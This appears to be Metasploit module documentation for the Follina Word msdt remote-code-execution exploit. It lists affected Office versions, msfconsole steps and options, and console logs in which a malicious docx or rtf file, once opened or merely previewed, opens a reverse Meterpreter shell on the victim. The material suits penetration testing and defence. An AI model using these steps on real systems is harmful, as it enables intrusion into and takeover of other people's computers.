There exists a vulnerability in Microsoft Word that leverages the remote template feature to achieve remote code
execution against the target.

The vulnerability came to light after an independent cyber-security research team known as `nao_sec` uncovered a Word
document ([05-2022-0438.doc](https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/)) that was uploaded to
VirusTotal from an IP address in Belarus.

The document uses the remote template feature to fetch an HTML document and then uses the `ms-msdt` scheme to execute
PowerShell code.

## Vulnerable Application

The vulnerability has been found in Office 2013, 2016, 2019, 2021, Office ProPlus and Office 365. It also applies to
Windows itself, e.g. it can be called from `.lnk` files and with `wget` into `PowerShell`.

The vulnerability is exploitable using `.RTF` files on all versions of Office 365, including current channel.

However, with Insider and Current builds of Office, it doesn't seem to work.

### Make your lab

You need an official version of Microsoft Office installed.

Tested on Microsoft Windows 10 1909 with Microsoft Office Word 2016.

## Verification Steps

1. Start `msfconsole`
2. `use exploit/windows/fileformat/word_msdtjs_rce`
3. `set SRVHOST [IP]`
4. `set LHOST [IP]`
5. `run`

## Options

**CUSTOMTEMPLATE**

A DOCX file that will be used as a template to build the exploit.

**OBFUSCATE**

Obfuscate JavaScript content. Default: true

**URIPATH**
The URI for the callback to get the payload.  Testing suggests this must be ANSI compatible and the full URI must be less than 76 characters.

## Scenarios

### Basic use

1. Generate the exploit for docx as following.

```
[*] Started reverse TCP handler on 172.20.32.36:4444 
[*] Using URL: http://172.20.32.36:8080/1GWqOqp7e1
[*] Server started.
[*] Generate a malicious docx file
[*] Using template '/tmp/payload.docx'
[*] Parsing item from template: docProps/
[*] Parsing item from template: docProps/core.xml
[*] Parsing item from template: docProps/app.xml
[*] Parsing item from template: word/
[*] Parsing item from template: word/theme/
[*] Parsing item from template: word/theme/theme1.xml
[*] Parsing item from template: word/styles.xml
[*] Parsing item from template: word/settings.xml
[*] Parsing item from template: word/document.xml
[*] Parsing item from template: word/_rels/
[*] Parsing item from template: word/_rels/document.xml.rels
[*] Parsing item from template: word/fontTable.xml
[*] Parsing item from template: word/webSettings.xml
[*] Parsing item from template: _rels/
[*] Parsing item from template: _rels/.rels
[*] Parsing item from template: [Content_Types].xml
[*] Injecting payload in docx document
[*] Finalizing docx 'msf.docx'
[+] msf.docx stored at /home/[REDACTED]/.msf4/local/msf.docx
[*] Powershell command length: 3724
```

2. Open the DOCX document on a remote vulnerable system.

```
[*] 172.20.32.36      word_msdtjs_rce - Sending HTML Payload
[*] 172.20.32.36      word_msdtjs_rce - Obfuscate JavaScript content
[*] 172.20.32.36      word_msdtjs_rce - Sending HTML Payload
[*] 172.20.32.36      word_msdtjs_rce - Obfuscate JavaScript content
[*] 172.20.32.36      word_msdtjs_rce - Sending HTML Payload
[*] 172.20.32.36      word_msdtjs_rce - Obfuscate JavaScript content
[*] 172.20.32.36      word_msdtjs_rce - Sending PowerShell Payload
[*] Sending stage (200262 bytes) to 172.20.32.36
[*] Meterpreter session 1 opened (172.20.32.36:4444 -> 172.20.32.36:42674 ) at 2022-05-30 19:32:37 +0400
```

### The 0-Click tip

You can get the 0-click by either selecting the 'rtf' option in converting, manually, the `.docx` file generated by the module into a `.rtf` file format.

### RTF 

1. Generate the exploit for rtf as following.
```
msf6 exploit(windows/fileformat/word_msdtjs_rce) > show options

Module options (exploit/windows/fileformat/word_msdtjs_rce):

Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
CUSTOMTEMPLATE                   no        A DOCX file that will be used as a template to build the exploit.
FILENAME        msf.docx         no        The file name.
OBFUSCATE       true             yes       Obfuscate JavaScript content.
OUTPUT_FORMAT   docx             yes       File format to use [docx, rtf]. (Accepted: docx, rtf)
SRVHOST         10.5.135.101     yes       The local host or network interface to listen on. This must be an address on the loca
l machine or 0.0.0.0 to listen on all addresses.
SRVPORT         8080             yes       The local port to listen on.
SSL             false            no        Negotiate SSL for incoming connections
SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
URIPATH                          no        The URI to use for this exploit (default is random)


Payload options (windows/x64/meterpreter/reverse_tcp):

Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
LHOST                      yes       The listen address (an interface may be specified)
LPORT     4444             yes       The listen port


Exploit target:

Id  Name
   --  ----
0   Microsoft Office Word


msf6 exploit(windows/fileformat/word_msdtjs_rce) > set filename test.rtf
filename => test.rtf
msf6 exploit(windows/fileformat/word_msdtjs_rce) > set output_format rtf
output_format => rtf
msf6 exploit(windows/fileformat/word_msdtjs_rce) > set lhost 10.5.135.101
lhost => 10.5.135.101
msf6 exploit(windows/fileformat/word_msdtjs_rce) > set verbose true
verbose => true
msf6 exploit(windows/fileformat/word_msdtjs_rce) > set disablepayloadhandler false
disablepayloadhandler => false
msf6 exploit(windows/fileformat/word_msdtjs_rce) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.5.135.101:4444
[*] Using URL: http://10.5.135.101:8080/7eIbCn81aas277
[*] Server started.
[*] Generating a malicious rtf file
[+] test.rtf stored at /home/tmoose/.msf4/local/test.rtf
msf6 exploit(windows/fileformat/word_msdtjs_rce) > [*] Powershell command length: 3718
```

2. Upload rtf file to remote host, make sure 'preview' is enabled, and click on the file.  (You don't need to open it, just click once to preview it)

```
[*] 10.5.132.101     word_msdtjs_rce - Sending HTML Payload
[*] 10.5.132.101     word_msdtjs_rce - Obfuscate JavaScript content
[*] 10.5.132.101     word_msdtjs_rce - Sending PowerShell Payload
[*] Sending stage (200774 bytes) to 10.5.132.101
[*] Meterpreter session 1 opened (10.5.135.101:4444 -> 10.5.132.101:51221) at 2022-08-17 10:56:01 -0500

msf6 exploit(windows/fileformat/word_msdtjs_rce) > sessions -i -1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : DESKTOP-D1E425Q
OS              : Windows 10 (10.0 Build 17134).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: DESKTOP-D1E425Q\msfuser
```

## References

  1. <https://www.reddit.com/r/blueteamsec/comments/v06w2o/suspected_microsoft_word_zero_day_in_the_wild/>
  2. <https://twitter.com/nao_sec/status/1530196847679401984?t=3Pjrpdog_H6OfMHVLMR5eQ&s=19>
  3. <https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/>
  4. <https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e>
  5. <https://twitter.com/GossiTheDog/status/1531608245009367040>
  6. <https://github.com/JMousqueton/PoC-CVE-2022-30190>
